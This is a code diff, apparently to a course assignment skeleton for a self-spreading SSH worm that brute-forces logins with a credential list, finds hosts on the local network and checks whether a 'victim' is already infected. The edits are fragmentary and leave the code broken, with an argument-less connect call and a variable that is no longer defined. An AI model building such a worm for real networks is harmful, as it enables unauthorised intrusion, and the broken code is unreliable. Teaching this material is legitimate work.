@@ -74,6 +74,7 @@ def spreadAndExecute(sshClient):
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
 
+	ssh.connect()
 	# Tries to connect to host host using
 	# the username stored in variable userName
 	# and password stored in variable password
@@ -94,7 +95,7 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	pass
+	#pass
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -120,6 +121,7 @@ def attackSystem(host):
 	# Go through the credentials
 	for (username, password) in credList:
 
+		tryCredentials(host, username, password, ssh)
 		# TODO: here you will need to
 		# call the tryCredentials function
 		# to try to connect to the
@@ -131,7 +133,7 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system.
-		pass
+		#pass
 
 	# Could not find working credentials
 	return None
@@ -146,7 +148,7 @@ def getMyIP(interface):
 
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	networkInterfaces = netifaces.interfaces()
+	#networkInterfaces = netifaces.interfaces()
 
 	ipAddr = networkInterfaces
 
@@ -157,7 +159,7 @@ def getMyIP(interface):
 			ipAddr = addr
 			break
 
-	return ipAddr 
+	return ipAddr
 
 #######################################################
 # Returns the list of systems on the same network
@@ -209,8 +211,10 @@ if len(sys.argv) < 2:
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
 	pass
-# TODO: Get the IP of the current system
 
+# TODO: Get the IP of the current system
+networkInterfaces = netifaces.interfaces()
+selfIP = getMyIP(networkInterfaces)
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
